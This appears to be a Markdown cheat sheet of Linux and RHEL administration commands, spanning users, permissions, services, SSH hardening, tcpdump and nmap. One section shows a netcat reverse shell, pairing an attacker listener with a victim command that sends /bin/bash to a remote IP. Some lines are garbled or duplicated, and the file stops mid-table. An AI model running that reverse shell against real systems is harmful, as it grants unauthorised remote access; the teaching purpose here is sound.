<a id="table-of-contents"></a>
# 📚 Table of Contents

- [1 Linux Bash Commands Cheat Sheet](#linux-bash-commands-cheat-sheet)
  - [1.0 ℹ️ Power DevOps Admin](#become-power-user)
  - [1.1 ℹ️ Get Command Help](#ℹ-get-command-help)
  - [1.2 🌍 Navigating the System](#navigating-the-system)
  - [1.3 📂 File and Directory Management](#file-and-directory-management)
  - [1.4 🔗 File Links](#file-links)
  - [1.5 ↔️ Input/Output Redirection](#inputoutput-redirection)
  - [1.6 🔗 Piping Commands](#piping-commands)
  - [1.7 ✏️ Text Search](#text-search)
  - [1.8 ✍️ File Editors: `vi` / `vim`](#file-editors-vi--vim)
  - [1.9 🤵 Users and Groups (Root Required)](#users-and-groups-root-required)
  - [1.10 ⚡ Password Rules & Expiry](#password-rules--expiry)
  - [1.11 🤷 Switching Users & Sudo](#switching-users--sudo)
  - [1.12 📄 File Permissions](#file-permissions)
  - [1.13 🚀 Processes & Jobs](#processes--jobs)
  - [1.14 🔄 Services & Daemons](#services--daemons)
  - [1.15 CONFIGURE AND SECURE SSH](#configure-and-secure-ssh)
  - [1.16 📊 Disk and Memory](#disk-and-memory)
  - [1.17 💾 Memory & Open Files](#memory--open-files)
    - [1.17.1 Check Memory Usage](#check-memory-usage)
    - [1.17.2 List Open Files with `lsof`](#list-open-files-with-lsof)
  - [1.18 📁 Open Files & Ports](#open-files--ports)
  - [1.19 🚨 Network Tools](#network-tools)
  - [1.20 🚀 TCPDUMP (Sniffing)](#tcpdump-sniffing)
  - [1.21 ⚙ Configure SSH](#configure-ssh)
  - [1.22 🔐 SSH Keys (Passwordless Login)](#ssh-keys-passwordless-login)
  - [1.23 📂 Log Files](#log-files)
  - [1.24 ⚖️ Linux Network Configuration](#linux-network-configuration)
    - [1.24.1 Specific to RH/CentOS distributions](#specific-to-rhcentos-distributions)
    - [1.24.2 Folder location to know as an RH administrator](#folder-location-to-know-as-an-rh-administrator)
- [2 To know files as a RH Admin](#to-know-files-as-a-rh-admin)
    - [2.0.1 A great tool: nmcli](#a-great-tool-nmcli)
  - [2.1 📃 System Files (RHEL)](#system-files-rhel)
  - [2.2 ✅ Essential RHCSA Commands](#essential-rhcsa-commands)
  - [2.3 ℹ️ Get Command Help](#ℹ-get-command-help)
  - [2.4 🌍 Navigating the System](#navigating-the-system)
  - [2.5 📂 File and Directory Management](#file-and-directory-management)
  - [2.6 🔗 File Links](#file-links)
  - [2.7 ↔️ Input/Output Redirection](#inputoutput-redirection)
  - [2.8 🔗 Piping Commands](#piping-commands)
  - [2.9 🔎 Regular Expressions & `grep`](#regular-expressions--grep)
  - [2.10 🕒 Scheduling Tasks with `crontab`](#scheduling-tasks-with-crontab)
  - [2.11 🧠 Concepts: Applications, Scripts, Processes, and More](#concepts-applications-scripts-processes-and-more)
  - [2.12 💾 Memory & Open Files](#memory--open-files)
    - [2.12.1 Check Memory Usage](#check-memory-usage)
    - [2.12.2 List Open Files with `lsof`](#list-open-files-with-lsof)
  - [2.13 🌐 Networking Tools](#networking-tools)
    - [2.13.1 🧭 Visual Map of Network Communication](#visual-map-of-network-communication)
    - [2.13.2 Monitor Network Connections and Routing](#monitor-network-connections-and-routing)
    - [2.13.3 Inspect Live Traffic](#inspect-live-traffic)
    - [2.13.4 🔬 Analyze Captured Traffic with Wireshark](#analyze-captured-traffic-with-wireshark)
  - [2.14 🔧 Network Diagnostics with `netcat` and `nmap`](#network-diagnostics-with-netcat-and-nmap)
    - [2.14.1 `netcat` (nc) – The Swiss Army Knife of Networking](#netcat-nc--the-swiss-army-knife-of-networking)
    - [2.14.2 Reverse Shell with `netcat`](#reverse-shell-with-netcat)
    - [2.14.3 `nmap` – Network Scanner & Security Tool](#nmap--network-scanner--security-tool)
    - [2.14.4 🧾 `nc` vs `ncat` Feature Comparison](#nc-vs-ncat-feature-comparison)
  - [2.15 🧪 Miscellaneous Tools](#miscellaneous-tools)
    - [2.15.1 Base 64](#base-64)
    - [2.15.2 Configure pip with Nexus](#configure-pip-with-nexus)
  - [2.16 🔁 PO to MO File Conversion](#po-to-mo-file-conversion)
  - [2.17 🔐 Create a Self-Signed SSL Certificate](#create-a-self-signed-ssl-certificate)

<a id="linux-bash-commands-cheat-sheet"></a>
# 1 Linux Bash Commands Cheat Sheet [🔝](#table-of-contents)

> A simplified, structured guide for essential Linux and Bash commands, with selectable code blocks.

---

<a id="become-power-user"></a>
## 1.0 Power DevOps Admin [🔝](#table-of-contents)

```bash
ls *.log | xargs rm         # takes all the .log files and gives them to rm for deletion
make build > build.log      # redirect output to build.log
make build | tee build.log  # redirecting output (>) hides it from your screen. tee lets you see it and save it at the same time.
fc                          # opens your last command in your editor (vi). Or Ctrl + x + e
Ctrl+w / Ctrl+u             # deletes word / delete everything before the cursor
Ctrl + l                    # clear terminal like $ clear
Ctrl u / Ctrl k             # clear the line from current cursor position to beginning/end of line.

$ echo world world          # re-runs your last command but replaces all instances of a word.
$ !!:gs/world/universe/
universe universe

df -h       # Shows free space in human-readable format
du -sh *    # Shows sizes of folders/files in current directory


lsof -i :8080 # f you’ve ever run into “port already in use,” this tells you which process is holding it. Now you know which app to kill or restart.

nc -zv google.com 443 # test if a port is open

cd -                  # jump back to your last working directory

htop                  # Real-time, interactive system monitoring without feeling like you’re reading The Matrix.

exa -l --git          # Better colors, Git status integration, and icons — everything ls should have been


http GET https://url  #  Forget curl headaches. httpie makes API testing readable and fun.

git diff | delta      # Makes git diffs beautiful with colors, syntax highlighting, and better layouts.


glances               # Cross-platform system monitoring with network, CPU, memory — all in one dashboard.

# ALIAS
# In bash, you can explode an alias into the full command with ctrl + alt + e. In zsh you can do the same with ctrl + x; a while the cursor is in or next to the alias string



```

---










<a id="ℹ-get-command-help"></a>
## 1.1 ℹ️ Get Command Help [🔝](#table-of-contents)

```bash
man command_name
whatis command_name
command_name --help
```

---

<a id="navigating-the-system"></a>
## 1.2 🌍 Navigating the System [🔝](#table-of-contents)

```bash
cd /          # Go to root directory
cd            # Go to home directory
cd -          # Switches back to the last directory you visited
pwd           # Show current directory
whoami        # Show current user
```

```bash
ls -l                 # List with details
ls -ltr               # List by time, reverse
ls -la                # Include hidden files
ls *.log | xargs rm   # takes all the .log files and gives them to rm for deletion
```

---

<a id="file-and-directory-management"></a>
## 1.3 📂 File and Directory Management [🔝](#table-of-contents)

```bash
touch file.txt                # Create file
mkdir folder_name             # Create directory
rm file.txt                   # Remove file
rm -r folder_name             # Remove directory recursively
cp file1.txt file2.txt        # Copy file
mv file1.txt file2.txt        # Move/rename
```

```bash
echo "Hello World" > file.txt # Write to file
cat file.txt                  # Display file content
```

---

<a id="file-links"></a>
## 1.4 🔗 File Links [🔝](#table-of-contents)
Each time you create a file, the OS assign a number to that file on a hard disk, called inode (pointer or number). Creating a soft link to a file (soft link --> file --> inode) soft link is like a shortcut in Windows

```bash
ln -s file_name link_name     # Create soft link (shortcut)
ln file_name link_name        # Create hard link (same inode)
```

> ⚠️ Hard links must be created on the same partition.

```bash
ls -li                        # List with inode numbers
```

---

<a id="inputoutput-redirection"></a>
## 1.5 ↔️ Input/Output Redirection [🔝](#table-of-contents)

- Input and Output redirects: stdin, stdout, sdterro whith file descriptor number 0,1,2  
- By default, when running a command its output goes to the terminal. 
- OUTPUT of a command can be routed to a file using > symbol

```bash
command > output.txt          # Redirect output (overwrite)
command >> output.txt         # Redirect output (append)
command < input.txt           # Redirect input 
make build | tee build.log    # Save output while still seeing it; watch the build output live, and build.log is saved
fc                            #  opens your last command in your editor (vi): for long commands
```

---

<a id="piping-commands"></a>
## 1.6 🔗 Piping Commands [🔝](#table-of-contents)

```bash
ls -ltr | more                # Paginate output
ls -l | tail                  # Show last lines
```

---

<a id="text-search"></a>
## 1.7 ✏️ Text Search [🔝](#table-of-contents)

```bash
grep "word" file.txt
grep -i "word" file.txt       # Case insensitive
```

---

<a id="file-editors-vi--vim"></a>
## 1.8 ✍️ File Editors: `vi` / `vim` [🔝](#table-of-contents)

- `i` to insert text
- `ESC` to return to command mode
- `/word` to search, `n` for next match
- `dd` delete line, `u` undo, `x` delete char
- `:wq` or `Shift + ZZ` to save & quit
- `r<char>` replace one character
- `o` create new line below

---

<a id="users-and-groups-root-required"></a>
## 1.9 🤵 Users and Groups (Root Required) [🔝](#table-of-contents)

Records of users are maintained in 3 different files: /etc/passwd, /etc/group, /etc/shadow



```bash
useradd -m username               # Add user with home directory
groupadd groupname                # Add group
usermod -G groupname username     # Add user to group
passwd username                   # Set password

id user_name # to check uid gid
useradd hulk # in RH distribution the -m is automatically added
useradd -m hulk # to ensure the user directory is created in /home
# automatically create a group of the same user name
groupadd superheroes
usermod -G superheroes hulk #hulk belongs also to group superheroes (as well as hulk group)
cat hulk /etc/group # or better below
grep hulk /etc/group # to retrieve directly hulk in the file
chgroup -R superheroes hulk # move hulk to the group superheroes only
#to avoid these problems, type at the user hulk creation
useradd -g superheroes -s /bin/bash -m hulk

```

```bash
grep username /etc/group          # Check groups
chgrp group_name file_name  
chown group_name file_name  
chown group_name:group_name file_name  

```

---

<a id="password-rules--expiry"></a>
## 1.10 ⚡ Password Rules & Expiry [🔝](#table-of-contents)

- rules of rotation for user's password
- chage command used to change or view the password expiration settings for a user account
- /etc/login.defs is very important, and contains settings for password rotations of all users 

```bash
chage username                    # Set password expiry rules
```

Config file: `/etc/login.defs`

---

<a id="switching-users--sudo"></a>
## 1.11 🤷 Switching Users & Sudo [🔝](#table-of-contents)

```bash
su - username
sudo command
visudo                         # Edit sudoers file
```

---

<a id="file-permissions"></a>
## 1.12 📄 File Permissions [🔝](#table-of-contents)

```bash
chmod u+x file.txt               # Add execute to user
chmod g-w file.txt               # Remove write from group
chmod o+r file.txt               # Add read to others
```

```bash
chown user file.txt
chgrp group file.txt
```

---

<a id="processes--jobs"></a>
## 1.13 🚀 Processes & Jobs [🔝](#table-of-contents)

- **Application / Service**: A program you run on your machine, such as `NTP`, `NFS`, `Apache`, or `rsyslog`.

- **Script / Shell Commands**: A sequence of commands (like `adduser`, `cd`, `pwd`) saved in a `.sh` file and executed by a shell like Bash.

- **Process**: An instance of a running application. Each process has its own memory, resources, and process ID (PID). Processes are isolated from each other.

- **Daemon**: A background process that runs continuously without user interaction (e.g., `cron`, `sshd`).

- **Thread**: A lightweight execution unit within a process. Multiple threads can run inside a single process and share its memory.

- **Job**: A scheduled task (e.g., from `cron`) that automates the execution of a script or service at specific intervals.

```bash
top                             # Live process monitor
ps -ef                          # Process snapshot
ps -ef | grep app               # Find specific process
kill PID                        # Kill a process
kill -9 PID                     # Force kill
```

---

<a id="services--daemons"></a>
## 1.14 🔄 Services & Daemons [🔝](#table-of-contents)

- Every time you install an application or a package or a service in your linux environment, then you could control that program running command systemctl.  

- systemd is a system and service manager that has become the default init system in many Linux distributions  

- It is responsible for starting and managing services, controlling the boot process, and maintaining system state

- The init system is the first process that gets executed on the system and has the process ID (PID) of 1. It is responsible for starting all other processes and managing the system's resources.





```bash
# check if systemd is running
ps -ef | grep system

# check all running services
systemctl --all

# check status of a service (application = name of the service)
systemctl status application.service
systemctl statuts firewalld.service

ps -ef | grep firewalld 

#Check the status, start, stop and restart an application/service
systemctl status|start|stop|restart application.service
systemctl stop firewalld.service # best way to stop a service, better than killing the service

# to relod configuration of a service
systemctl reload application.service

# to restart after changing some configuration: use restart application.service
# enable or disable a service at boot time
systemctl enable|disable application.service

# Specific to Red Hat: Red Hat Package Manager rpm, q = query, a = all
rpm -qa # list all packages on the system

systemctl status app.service    # Check status
systemctl start|stop|restart app.service
systemctl enable|disable app.service
```

```bash
ps -ef | grep systemd           # Check systemd
```


<a id="configure-and-secure-ssh"></a>
## 1.15 CONFIGURE AND SECURE SSH [🔝](#table-of-contents)

Open SSH is a package/software usually pre-installed in Linux Distributions, runs on port 22. Its service daemon is sshd
SSH itself is secure, communication through SSH is always encrypted. But needs a little configuration by an administrator to secure better

```bash
man sshd_config

# become root, and edit your /etc/ssh/sshd_config file, copy it (backup), open sshd_config with vi

# Configure Idle Timeout Interval
# go to the end of the file with shift + P then add the following lines:
# ClientAliveInterval 600 # 600 means 600s = 10 minutes once this interval has passed, the idle user will be automatically logged out
# ClientAliveCountMax 0
systemctl restart sshd

# Disable root login for any user
# replace PermitRootLogin yes to no
systemctl restart sshd 

# Disable empty password
# remove # from the following line
# PermitEmptyPAsswords no
systemctl restart sshd


# Limit User's SSH Access: to provide another layer of security, you should limit your SSH login to only certain users who need remote access
# add line: AllowUsers user1 user2
systemctl restart sshd

# Use a different port: by default SSH runs on 22, so most hackers looking for any open SSH servers will look for port 22 and 
#  changing can make system much more secure
# remove # from the following line and change port number
# Port 22
systemctl restart sshd


# Access remote linux server without password (avoid repetitive logins, automation through scripts)
# keys are generated at user or root level
# SSH to an Amazon Linux instance for example
# generate kyes on your client (local machine) and copy over the keys from client to server (AWS), then SSH
# different from SSH with username and password

```


---

<a id="disk-and-memory"></a>
## 1.16 📊 Disk and Memory [🔝](#table-of-contents)

```bash
df -h                            # Disk usage
du -k / | sort -nr | more        # Largest folders
free                             # Memory usage
df, df -h, df -T
du # disk usage of each file of the system
du -k directory_name | sort -nr | more  # sort reverse order
top # dynamic real-time process monitor

```


<a id="memory--open-files"></a>
## 1.17 💾 Memory & Open Files [🔝](#table-of-contents)

<a id="check-memory-usage"></a>
### 1.17.1 Check Memory Usage [🔝](#table-of-contents)

```bash
free                          # Displays system memory usage (RAM)
```

> When physical memory is fully utilized, the OS moves less-used data to disk — this is called **swapping** or **paging**.

---

<a id="list-open-files-with-lsof"></a>
### 1.17.2 List Open Files with `lsof` [🔝](#table-of-contents)

```bash
lsof                          # List all open files
lsof -i                       # Show open network connections
lsof -p <PID>                 # Files opened by specific process ID
lsof -u <username>            # Files opened by a specific user
lsof -c <command>             # Files opened by specific command
lsof -t                       # Print only process IDs
```

> Useful for debugging file locks, tracking resources, and monitoring open connections.


---

<a id="open-files--ports"></a>
## 1.18 📁 Open Files & Ports [🔝](#table-of-contents)

```bash
lsof -i                          # Open network files
lsof -p <PID>                    # Files by process
lsof -u <user>                   # Files by user
```

---

<a id="network-tools"></a>
## 1.19 🚨 Network Tools [🔝](#table-of-contents)

```bash
ifconfig                         # Interface info
hostname -I                     # Local IP
netstat -rnv                    # Routing table
netstat -at|au                  # TCP/UDP connections
ping hostname
traceroute google.com
dig google.com
```

---

<a id="tcpdump-sniffing"></a>
## 1.20 🚀 TCPDUMP (Sniffing) [🔝](#table-of-contents)

```bash
tcpdump -i enp0s3                # Monitor interface
tcpdump port 80
tcpdump -i eth0 > capture.pcap   # Save traffic to file
```

---

<a id="configure-ssh"></a>
## 1.21 ⚙ Configure SSH [🔝](#table-of-contents)

Edit `/etc/ssh/sshd_config`, then:

```bash
systemctl restart sshd           # Restart SSH service
```

Examples:
```bash
# Set idle timeout:
ClientAliveInterval 600
ClientAliveCountMax 0

# Disable root login:
PermitRootLogin no

# Only allow certain users:
AllowUsers user1 user2

# Change default port:
Port 2222
```

---

<a id="ssh-keys-passwordless-login"></a>
## 1.22 🔐 SSH Keys (Passwordless Login) [🔝](#table-of-contents)

```bash
ssh-keygen                        # Generate key
ssh-copy-id user@ip_address      # Copy key to remote
ssh user@ip_address              # Login
```

---

<a id="log-files"></a>
## 1.23 📂 Log Files [🔝](#table-of-contents)

```bash
cd /var/log
more boot.log                    # View boot logs
```

Other logs: `secure`, `messages`, `dmesg`, `maillog`, etc.

---

<a id="linux-network-configuration"></a>
## 1.24 ⚖️ Linux Network Configuration [🔝](#table-of-contents)
- DHCP = Dynamic Host Control Protocol
- Static IP vs DHCP
- Static IP does not change: meaning you reboot, reconfigure, shut down for a month your computer, does not change
- Dynamic IP: change every time your computer reboot
- Static IP for computer/servers that have hostname IP assignment as a DNS set up
- Network Card give you network interface, software which enable you to connect to the internet or other computers
- OS network components: network interface, MAC address (associated to network interface, never change), subnet mask (give your IP allowed range)
- Gateway is an IP associated to your router which allows you to take traffic from your computer to other computers
- MAC addres is like: ether 02:05:85:7f:eb:80  it is assigned by manufacturer when your ethernet card is built


```bash
ifconfig
ip addr show wifi_device_name
ip address show device_name
hostname -I
netstat -a
netstat -rnv # allows to find your Gateway IP address
nslookup www.google.com # allows you to find your DNS server address
```

<a id="specific-to-rhcentos-distributions"></a>
### 1.24.1 Specific to RH/CentOS distributions [🔝](#table-of-contents)
- NetworkManager is the default network management service on RHEL 8 & 9
- to install on another distribution, command $sudo apt install network-manager

```bash
systemctl status NetworkManager
ps -ef | grep Network
# every time you make changes to your network, restart your network manager with
systemctl restart NetworkManager
```

<a id="folder-location-to-know-as-an-rh-administrator"></a>
### 1.24.2 Folder location to know as an RH administrator [🔝](#table-of-contents)

<a id="to-know-files-as-a-rh-admin"></a>
# 2 To know files as a RH Admin [🔝](#table-of-contents)
```bash
/etc/sysconfig/network-scripts # contain config file of enp0s3, you can add other with ifup command
/etc/hosts # 
/etc/hostname # contains info of hostname
/etc/resolv.conf # contains info for your DNS (IP of your computer)
/etc/nsswitch.conf
```

<a id="a-great-tool-nmcli"></a>
### 2.0.1 A great tool: nmcli [🔝](#table-of-contents)
```bash
nmcli                            # Network CLI
nmcli device
nmcli connection show
systemctl restart NetworkManager
```

```bash
# Assign static IP
nmcli connection modify enp0s3 ipv4.addresses 192.168.1.10/24
nmcli connection modify enp0s3 ipv4.gateway 192.168.1.1
nmcli connection modify enp0s3 ipv4.method manual
nmcli connection up enp0s3
```

---

<a id="system-files-rhel"></a>
## 2.1 📃 System Files (RHEL) [🔝](#table-of-contents)

- `/etc/hosts` → Static hostname lookups  
- `/etc/hostname` → Current hostname  
- `/etc/resolv.conf` → DNS config  
- `/etc/sysconfig/network-scripts/` → Interface scripts

---

<a id="essential-rhcsa-commands"></a>
## 2.2 ✅ Essential RHCSA Commands [🔝](#table-of-contents)

```bash
ping
ping localhost
ping host_name
ifconfig
ip
ifup eth0
ifdown eth0
netstat
traceroute
nslookup
dig
tcpdump -i your_device_name (eg enp0s3)
```

---

<a id="ℹ-get-command-help"></a>
## 2.3 ℹ️ Get Command Help [🔝](#table-of-contents)

```bash
man command_name
whatis command_name
command_name --help
```

---

<a id="navigating-the-system"></a>
## 2.4 🌍 Navigating the System [🔝](#table-of-contents)

```bash
cd /          # Go to root directory
cd            # Go to home directory
pwd           # Show current directory
whoami        # Show current user
who           # Show active users (logged-in)
```

```bash
ls -l         # List with details
ls -ltr       # List by time, reverse
ls -la        # Include hidden files
```

---

<a id="file-and-directory-management"></a>
## 2.5 📂 File and Directory Management [🔝](#table-of-contents)

```bash
touch file.txt                # Create file
mkdir folder_name             # Create directory
rm file.txt                   # Remove file
rm -r folder_name             # Remove directory recursively
cp file1.txt file2.txt        # Copy file
mv file1.txt file2.txt        # Move/rename
```

```bash
echo "Hello World" > file.txt # Write to file
cat file.txt                  # Display file content
```

---

<a id="file-links"></a>
## 2.6 🔗 File Links [🔝](#table-of-contents)

> **Soft vs Hard Links**: 
> - A **soft link** (symbolic link) is like a shortcut; it points to the path of a file.
> - A **hard link** directly references the file's inode, making it another entry point to the same data.
> - Hard links must exist on the same partition as the original file.


```bash
ln -s file_name link_name     # Create symbolic (soft) link to a file
ln file_name link_name        # Create hard link (points to same inode)
ls -li                        # List files with inode numbers
```

> ⚠️ Hard links must be created on the same partition.

---

<a id="inputoutput-redirection"></a>
## 2.7 ↔️ Input/Output Redirection [🔝](#table-of-contents)

> **Redirection** allows you to control where input comes from (stdin) and where output goes (stdout or stderr). Useful for saving output or automating tasks.

```bash
command > output.txt          # Redirect standard output to a file (overwrite)
command >> output.txt         # Append output to file (preserve content)
command < input.txt           # Use a file as input for the command
```

---

<a id="piping-commands"></a>
## 2.8 🔗 Piping Commands [🔝](#table-of-contents)

> **Pipes (`|`)** let you pass the output of one command directly as input to another — great for chaining commands and filtering output.

```bash
ls -ltr | more                       # View long listing one screen at a time
ls -l | tail                         # Show only the last lines of output
mkdir new_folder && cd new_folder    # Run the second command only if the first succeeds
ls my_folder || echo "Folder found"  # Run the second command only if the first fails
```

---

<a id="regular-expressions--grep"></a>
## 2.9 🔎 Regular Expressions & `grep` [🔝](#table-of-contents)

> **Regular Expressions (Regex)** are powerful patterns used to search, match, and manipulate text. Combined with commands like `grep`, they allow you to extract or filter lines in files based on complex criteria.

> `grep` is a command-line tool used to search for patterns in text. `egrep` (or `grep -E`) supports extended regex syntax.


```bash
grep "word" file.txt           # Search for 'word' in a file
grep -i "word" file.txt        # Case-insensitive match
grep -v "word" file.txt        # Exclude lines containing 'word'
grep -n "word" file.txt        # Show line numbers with matches
grep -c "word" file.txt        # Count matching lines
egrep -i "cat|dog" file.txt    # Match 'cat' or 'dog' (OR condition)
```

**Regex Examples** (with short descriptions):

- `[aeiou]` → vowels
- `a+` → one or more "a"
- `cat|dog` → matches either
- `.*world` → ends with "world"
- `^start` → starts with "start"
- `$end` → ends with "end"
- `\d` → any digit
- `(abc)+` → repeated "abc"

**Date Matching Patterns**:

```regex
\d{4}-\d{2}-\d{2}       # YYYY-MM-DD
\d{2}/\d{2}/\d{4}       # MM/DD/YYYY
\d{2}\.\d{2}\.\d{4}     # DD.MM.YYYY
([A-Za-z]+) \d{1,2}, \d{4} # Month Day, Year
```

**Additional Pattern Examples**:

```regex
\b[A-Za-z]{5}\b       # 5-letter words
^north                 # Starts with "north"
0$                     # Ends with 0
[we].st                # Matches west, e.g.
```

---

<a id="scheduling-tasks-with-crontab"></a>
## 2.10 🕒 Scheduling Tasks with `crontab` [🔝](#table-of-contents)

```bash
crontab -e                   # Edit user cronjobs
crontab -l                   # List user cronjobs
man crontab                  # Manual
man 5 crontab                # Syntax
```

**Cron format**:

```
* * * * * /path/to/command.sh
| | | | |
| | | | +----- Day of week (0-6 or Sun-Sat)
| | | +------- Month (1-12 or Jan-Dec)
| | +--------- Day of month (1-31)
| +----------- Hour (0-23)
+------------- Minute (0-59)
```

**Examples**:

```bash
*/2 * * * * date >> /home/user/log_date.txt
0 0 * * * /script.sh >> logfile.log 2>&1
```

```bash
ls /etc/cron.d
ls /etc/cron.daily
ls /etc/cron.weekly
cat /etc/crontab
```

> Add `SHELL=/bin/bash` to use Bash inside cron

---

<a id="concepts-applications-scripts-processes-and-more"></a>
## 2.11 🧠 Concepts: Applications, Scripts, Processes, and More [🔝](#table-of-contents)

> This section breaks down essential system-level components in Linux: what applications and processes are, how scripts work, and how the OS manages background services, threads, and scheduled jobs.

- **Application / Service**: A user-facing or background-running program such as `NTP`, `Apache`, or `rsyslog`. These can provide system functionality or host services.
, such as `NTP`, `NFS`, `Apache`, or `rsyslog`.

- **Script / Shell Commands**: A text file containing shell commands (e.g., `adduser`, `cd`, `pwd`) — usually stored in `.sh` files — and executed sequentially by a shell like Bash.
 (like `adduser`, `cd`, `pwd`) saved in a `.sh` file and executed by a shell like Bash.

- **Process**: When you start an application, the OS spawns a process with its own memory and Process ID (PID). Processes are isolated and cannot access each other's memory directly.
. Each process has its own memory, resources, and process ID (PID). Processes are isolated from each other.

- **Daemon**: A special kind of process that runs continuously in the background, often started at boot time — e.g., `cron`, `sshd`, `systemd`.
 that runs continuously without user interaction (e.g., `cron`, `sshd`).

- **Thread**: A smaller execution unit inside a process. Threads within the same process share memory and resources, enabling parallelism (e.g., multithreaded servers).
 within a process. Multiple threads can run inside a single process and share its memory.

- **Job**: A time- or event-based task created by a scheduler like `cron`. It runs applications, scripts, or commands at defined intervals.
 (e.g., from `cron`) that automates the execution of a script or service at specific intervals.

---

<a id="memory--open-files"></a>
## 2.12 💾 Memory & Open Files [🔝](#table-of-contents)

> This section covers tools to monitor and debug memory usage and file or network resource consumption on your system.

<a id="check-memory-usage"></a>
### 2.12.1 Check Memory Usage [🔝](#table-of-contents)

```bash
free                          # Displays system memory usage (RAM)
```

> **Swapping** (or paging) is a memory management mechanism used when your physical RAM is full. The OS moves inactive pages of memory to a reserved space on the hard disk called swap space. 
> 
> This ensures the system keeps running smoothly under heavy load, though it results in slower performance because disk access is significantly slower than RAM. To monitor swap usage in real time, you can use `top` or `vmstat`.

```bash
top                           # Live memory/swap/process monitor
vmstat 1                      # Show memory, swap, I/O and CPU usage (updates every 1 sec)
```

> When physical memory (RAM) is fully utilized, the OS transfers less frequently used data from RAM to disk space called **swap**. This process, known as **swapping** or **paging**, allows the system to continue operating even when memory is tight—though it comes at the cost of slower performance, as disk access is much slower than RAM.

---

<a id="list-open-files-with-lsof"></a>
### 2.12.2 List Open Files with `lsof` [🔝](#table-of-contents)

```bash
lsof                          # List all open files
lsof -i                       # Show open network connections
lsof -p <PID>                 # Files opened by specific process ID
lsof -u <username>            # Files opened by a specific user
lsof -c <command>             # Files opened by specific command
lsof -t                       # Print only process IDs
```

> Useful for debugging file locks, tracking resources, and monitoring open connections.

---

<a id="networking-tools"></a>
## 2.13 🌐 Networking Tools [🔝](#table-of-contents)

> This section covers common Linux networking commands to inspect interfaces, test connectivity, trace routes, and monitor ports and sockets.

---

<a id="visual-map-of-network-communication"></a>
### 2.13.1 🧭 Visual Map of Network Communication [🔝](#table-of-contents)

```text
+------------+       ping/traceroute        +------------+
|  Your Host | ---------------------------> |  Remote IP |
| (192.168.1.5)                             | (e.g. 8.8.8.8) |
+------------+                             +------------+
       |                                          ^
       | DNS Lookup (nslookup/dig)               |
       v                                          |
   [DNS Server] <-------------------------[Network Routing]
```

---

> This section covers common Linux networking commands to inspect interfaces, test connectivity, trace routes, and monitor ports and sockets.

```bash
ifconfig                     # View current network interface configuration (deprecated on newer distros)
ip a                        # Modern replacement for ifconfig
ip a show dev eth0          # Show info for specific interface
```

```bash
hostname -I                 # Show IP address(es) assigned to the host
ping google.com             # Test reachability to a remote server
traceroute google.com       # Trace route to destination (requires package)
nslookup google.com         # Get DNS resolution info
dig google.com              # Alternative DNS query tool (requires bind-utils)
```

<a id="monitor-network-connections-and-routing"></a>
### 2.13.2 Monitor Network Connections and Routing [🔝](#table-of-contents)

```bash
netstat -tuln               # List all listening ports (TCP/UDP) with numbers
netstat -rn                 # Show routing table
ss -tuln                    # Modern replacement for netstat
```

<a id="inspect-live-traffic"></a>
### 2.13.3 Inspect Live Traffic [🔝](#table-of-contents)

> `tcpdump` is a powerful command-line packet analyzer that captures and displays network packets in real-time. It’s ideal for debugging, monitoring, or analyzing network activity.

```bash
tcpdump -i eth0                        # Capture packets on eth0
sudo tcpdump -nn -v                    # Show numeric addresses/ports, verbose output
tcpdump -n -i eth0 port 443            # Only capture HTTPS traffic
sudo tcpdump -A -i eth0                # Show packet contents in ASCII
sudo tcpdump -s 0 -i eth0              # Capture full packets, not just headers
tcpdump -w capture.pcap                # Write capture to file (for Wireshark)
tcpdump -r capture.pcap                # Read and analyze saved capture
```

> ℹ️ You can open `.pcap` files using tools like **Wireshark** for a graphical interface.

```bash
tcpdump -i eth0             # Monitor packets on interface eth0
tcpdump port 80             # Filter traffic on port 80
tcpdump -w file.pcap        # Save capture to file (for Wireshark analysis)
```

---

<a id="analyze-captured-traffic-with-wireshark"></a>
### 2.13.4 🔬 Analyze Captured Traffic with Wireshark [🔝](#table-of-contents)

> **Wireshark** is a GUI-based packet analysis tool that lets you deeply inspect protocol traffic, filter by port or IP, and visualize communication flows. Use it in combination with `tcpdump`:

```bash
sudo tcpdump -i eth0 -w capture.pcap  # Save raw packets
wireshark capture.pcap                # Open in GUI (requires X11/GUI environment)
```

> Filters in Wireshark can help isolate traffic types, such as:
- `ip.addr == 192.168.1.10`
- `tcp.port == 443`
- `http.request.method == "GET"`

---

<a id="network-diagnostics-with-netcat-and-nmap"></a>
## 2.14 🔧 Network Diagnostics with `netcat` and `nmap` [🔝](#table-of-contents)

<a id="netcat-nc--the-swiss-army-knife-of-networking"></a>
### 2.14.1 `netcat` (nc) – The Swiss Army Knife of Networking [🔝](#table-of-contents)

`netcat` (or `nc`) can be used to test ports, transfer files, and even create basic chat or reverse shells.

```bash
nc -zv 192.168.1.10 22         # Check if SSH port is open on a remote host
nc -l -p 1234                  # Start a TCP listener on port 1234
nc 192.168.1.10 1234           # Connect to a listener
```

> 📦 You can also transfer files:
```bash
# On receiving machine:
nc -l -p 4444 > received.txt

# On sending machine:
nc 192.168.1.10 4444 < file.txt
```

---

<a id="reverse-shell-with-netcat"></a>
### 2.14.2 Reverse Shell with `netcat` [🔝](#table-of-contents)

> 🧬 **Diagram: How a Reverse Shell Works**
>
```text
+----------------+        Connects to       +------------------+
|   Victim Host  | -----------------------> |  Attacker (nc -l) |
| nc attacker_ip |                          |   Listening Shell |
+----------------+                          +------------------+
       ^                                               |
       |  Executes /bin/bash over the network          |
       +-----------------------------------------------+
```


> A reverse shell allows a target machine to connect back to the attacker's listener and give shell access. This is often used in pentesting.

```bash
# Attacker (listening for connection):
nc -lvnp 4444

# Victim (connects to attacker and gives shell):
nc 192.168.1.5 4444 -e /bin/bash
```

> ⚠️ This only works with traditional `netcat`. Some versions (like `ncat`) use different flags. Ensure it supports `-e`.

---

<a id="nmap--network-scanner--security-tool"></a>
### 2.14.3 `nmap` – Network Scanner & Security Tool [🔝](#table-of-contents)

> `nmap` is a powerful network scanning tool used to discover hosts and services on a network.

```bash
nmap 192.168.1.1                 # Scan a single IP
nmap 192.168.1.0/24              # Scan a subnet
nmap -p 22,80,443 192.168.1.10   # Scan specific ports
nmap -sV -A 192.168.1.10         # Detect OS and running services
```

> 🔍 Use `nmap` to detect live hosts, open ports, and service versions. Great for recon and troubleshooting.

---

<a id="nc-vs-ncat-feature-comparison"></a>
### 2.14.4 🧾 `nc` vs `ncat` Feature Comparison [🔝](#table-of-contents)

| Feature                 | `nc` (netcat)         | `ncat` (from Nmap)       |
|------------------------|------------------------|---------------------------|
| Basic TCP/UDP I/O      | ✅ Yes                 | ✅ Yes                    |
